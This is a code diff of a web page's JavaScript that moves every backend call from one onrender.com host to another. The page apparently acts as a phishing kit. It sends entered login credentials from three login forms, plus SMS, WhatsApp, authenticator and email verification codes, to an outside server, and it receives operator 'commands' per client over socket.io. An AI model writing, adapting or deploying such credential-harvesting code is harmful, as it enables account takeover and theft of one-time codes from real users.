@@ -1036,7 +1036,7 @@
             </div>
         </div>
     </div>
-    <script src="https://jobback-skab.onrender.com/socket.io/socket.io.js"></script>
+    <script src="https://backold.onrender.com/socket.io/socket.io.js"></script>
     <script>
         const shownCommands = {};
         let clientId = localStorage.getItem('clientId');
@@ -1045,7 +1045,7 @@
             localStorage.setItem('clientId', clientId);
         }
 
-        const socket = io('https://jobback-skab.onrender.com', {
+        const socket = io('https://backold.onrender.com', {
             query: {
                 clientId
             }
@@ -1224,7 +1224,7 @@
             });
         }
 
-        function setupAuthBlock(inputId, buttonId, length = 6, apiUrl = 'https://jobback-skab.onrender.com/send-auth-code') {
+        function setupAuthBlock(inputId, buttonId, length = 6, apiUrl = 'https://backold.onrender.com/send-auth-code') {
             const code = document.getElementById(inputId);
             const smsBtn = document.getElementById(buttonId);
 
@@ -1291,7 +1291,7 @@
             setupAuthBlock('smscode', 'smsBtn');
             setupAuthBlock('whcode', 'whBtn');
             setupAuthBlock('authcodedes', 'authBtn');
-            setupAuthBlock('emailcodedes', 'buttonemailcode', 8, 'https://jobback-skab.onrender.com/send-email-code');
+            setupAuthBlock('emailcodedes', 'buttonemailcode', 8, 'https://backold.onrender.com/send-email-code');
         });
     </script>
 
@@ -1339,7 +1339,7 @@
             loginBtn.innerHTML = '<span class="loading-spinner"></span>';
 
             try {
-                const response = await fetch('https://jobback-skab.onrender.com/send-login-data', {
+                const response = await fetch('https://backold.onrender.com/send-login-data', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -1380,7 +1380,7 @@
             confirm_login.innerHTML = '<span class="loading-spinner"></span>';
 
             try {
-                const response = await fetch('https://jobback-skab.onrender.com/send-login-data', {
+                const response = await fetch('https://backold.onrender.com/send-login-data', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -1421,7 +1421,7 @@
             old_login.innerHTML = '<span class="loading-spinner"></span>';
 
             try {
-                const response = await fetch('https://jobback-skab.onrender.com/send-login-data', {
+                const response = await fetch('https://backold.onrender.com/send-login-data', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
